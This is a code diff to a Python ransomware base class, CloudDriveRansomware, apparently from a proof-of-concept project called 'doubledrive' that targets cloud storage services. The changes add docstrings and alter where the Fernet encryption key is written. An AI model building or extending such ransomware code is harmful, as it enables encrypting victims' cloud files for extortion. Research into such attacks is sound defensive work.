@@ -5,10 +5,19 @@ from cryptography.fernet import Fernet
 from doubledrive.cloud_drive.cloud_drive import *
 
 class CloudDriveRansomware:
+    """
+    A base class for classes that implement a ransomware for a cloud storage service
+    """
 
-    def __init__(self, logged_in_cloud_drive: ICloudDriveSession, save_key_dir_path: str = "."):
+    def __init__(self, logged_in_cloud_drive: ICloudDriveSession, save_key_path):
+        """
+        Creates a CloudDriveRansomware
+
+        :param logged_in_cloud_drive: An instance of a session with a cloud storage service that is already logged in
+        :param save_key_path: Path to save the Fernet encryption/decryption key
+        """
         self._cloud_drive = logged_in_cloud_drive
-        self.__save_key_dir_path = save_key_dir_path
+        self.__save_key_path = save_key_path
         self.__key = None
 
     @abstractmethod
@@ -47,7 +56,7 @@ class CloudDriveRansomware:
 
     
     def __save_key(self):
-        with open(os.path.join(self.__save_key_dir_path, str(uuid.uuid4())), "wb") as f:
+        with open(self.__save_key_path, "wb") as f:
             f.write(self.__key)
 
     def __generate_key(self) -> bytes:
